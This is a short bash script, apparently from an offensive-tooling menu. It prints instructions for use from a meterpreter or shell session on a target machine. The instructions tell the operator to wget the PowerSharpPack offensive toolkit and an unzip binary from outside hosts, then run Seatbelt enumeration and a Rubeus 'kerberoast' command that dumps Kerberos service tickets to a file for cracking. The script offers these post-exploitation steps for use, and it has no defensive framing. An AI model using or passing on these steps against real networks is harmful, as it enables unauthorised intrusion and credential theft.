#!/bin/bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'
RED='\033[0;31m'
LGRY='\033[0;37m'
INV='\e[7m'
BRED='\033[1;31m'
UPURPLE='\033[4;35m'
UBLUE='\033[4;34m'
URED='\033[4;31m'

echo -e "${RED}"
figlet PowerSharp
echo -e "${W}This tool is to be used from a shell/meterpreter session on a target machine"
echo -e "${YLW}To use, from a meterpreter/shell session run the following commands${NC}"
echo ""
echo -e "${RED}wget https://github.com/S3cur3Th1sSh1t/PowerSharpPack/archive/master.zip"
echo -e "wget http://stahlworks.com/dev/unzip.exe"
echo -e "unzip.exe master.zip"
echo -e "cd master${NC}"
echo ""
echo -e "${W}Then use ${YLW}.\PowerSharpPark.ps1${W} to execute the script."
echo ""
echo -e "${LP}example commands:\n${YLW}= PowerSharpPack -Seatbelt -Command \"all\""
echo -e "= PowerSharpPack -Rubeus -Command \"kerberoast /outfile:Roasted.txt\""
read

##########################______________ VGhlIERlYWQgQnVubnkgQ2x1Yg== ______________##########################